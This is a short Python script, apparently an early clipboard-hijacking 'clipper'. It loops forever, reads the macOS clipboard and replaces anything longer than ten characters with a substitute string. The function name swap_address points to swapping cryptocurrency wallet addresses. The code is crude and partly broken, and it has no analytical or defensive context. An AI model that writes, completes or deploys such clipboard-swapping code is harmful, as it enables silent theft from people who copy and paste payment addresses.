import subprocess

podmiana = "test"


def get_clipboard():
    p = subprocess.Popen(['pbpaste'], stdout=subprocess.PIPE)
    data = str(p.stdout.read())
    if len(data) > 10:
        swap_address(data)

  

def swap_address(data):
    p = subprocess.Popen(['pbcopy'], stdin=subprocess.PIPE)
    p.stdin.write(podmiana)




while True:
    get_clipboard()
